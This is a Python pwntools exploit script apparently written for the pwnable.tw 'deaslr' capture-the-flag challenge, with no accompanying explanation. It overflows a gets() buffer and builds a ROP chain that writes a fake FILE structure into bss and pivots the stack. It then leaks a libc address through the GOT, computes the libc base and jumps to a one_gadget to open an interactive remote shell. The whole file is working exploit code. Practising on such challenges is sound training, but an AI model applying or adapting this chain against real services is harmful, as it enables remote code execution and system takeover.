from pwn import *

#p = process("./deaslr", env={"LD_PRELOAD":"./libc_64.so.6"})
p = remote("chall.pwnable.tw", 10402)
elf = ELF("./deaslr")
libc = ELF("./libc_64.so.6")
context.log_level = "debug"

# addr
main_addr = 0x400536
gets_plt = elf.symbols["gets"]
gets_got = elf.got["gets"]
bss_addr = 0x601010
data_addr = 0x601000

# gadget
pop_rbp_ret = 0x4004a0
leave_ret = 0x400554
ret = 0x4003f9
pop_rdi_ret = 0x4005c3
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
pop_r12_r13_r14_r15_ret = 0x4005bc
pop_rsp_r13_r14_r15_ret = 0x4005bd
call_r12_plus_rbx_mul_8 = 0x4005a9
set_args_and_call = call_r12_plus_rbx_mul_8 - 0x9
mveax0_leave_ret = 0x40054f

# struct
fake_file = b"\x00"*0x70+p64(1)+p64(2) # fileno flag
fake_file = fake_file.ljust(0xe0, b"\x00")

def exp():
    #gdb.attach(p, "b *0x40054f\nc\n")

    # write fake_file to bss
    fake_file_addr = bss_addr+0x100
    payload1 = b"a"*0x18 + p64(pop_rdi_ret) + p64(fake_file_addr) + p64(gets_plt) + p64(main_addr)
    p.sendline(payload1)

    p.sendline(fake_file)

    # Migrate stack to bss (to control stack_val)
    target_stack = bss_addr+0x200
    payload2 = b"a"*0x10 + p64(target_stack) + p64(pop_rdi_ret) + p64(target_stack) + p64(gets_plt)
    payload2 += p64(leave_ret)
    p.sendline(payload2)

    # write target_stack
    target_stack_2 = bss_addr + 0x400
    payload3 = p64(0xdeadbeef) #new rbp
    payload3 += p64(pop_rdi_ret) # get(target_stack_2)
    payload3 += p64(target_stack_2) #arg
    payload3 += p64(gets_plt)

    payload3 += p64(pop_rsp_r13_r14_r15_ret) # move to stack_2
    payload3 += p64(target_stack_2)
    p.sendline(payload3)

    # set target_stack_2
    payload4 = p64(0)*3
    payload4 += p64(pop_rdi_ret)
    payload4 += p64(target_stack-0x30-0x30)
    payload4 += p64(gets_plt) # set stack low
    payload4 += p64(pop_rdi_ret)
    payload4 += p64(target_stack-0x30+0x8)
    payload4 += p64(gets_plt) # set stack high
    payload4 += p64(pop_rsp_r13_r14_r15_ret)
    payload4 += p64(target_stack-0x30-0x30)
    p.sendline(payload4)

    ## low
    low = p64(0)*3 + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
    low += p64(0xfffffffffffffdeb) #rbx
    low += p64(0xfffffffffffffdeb+1) #rbp
    p.sendline(low)
    ## high
    high = p64(0x100) #r13 -> rdx
    high += p64(gets_got) #r14 -> rsi
    high += p64(fake_file_addr) #r15 -> edi
    high += p64(set_args_and_call)
    high += b"a"*0x38
    high += p64(main_addr)
    p.sendline(high)

    # get leak addr
    puts_addr = u64(p.recv(8))
    libc_base = puts_addr - libc.symbols["gets"]
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh"))
    one = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
    one_gadget = libc_base + one[0]
    print("puts_addr:", hex(puts_addr))
    print("libc_base:", hex(libc_base))
    print("system:", hex(system))
    print("binsh:", hex(binsh))
    print("one_gadget:", hex(one_gadget))

    ## get shell
    #payload5 = b"a"*0x18 + p64(pop_rdi_ret) + p64(binsh) + p64(ret)*8 + p64(system) + p64(main_addr)
    payload5 = b"a"*0x18 + p64(one_gadget) # set eax=0

    p.sendline(payload5)

    p.interactive()

if __name__ == "__main__":
    exp()

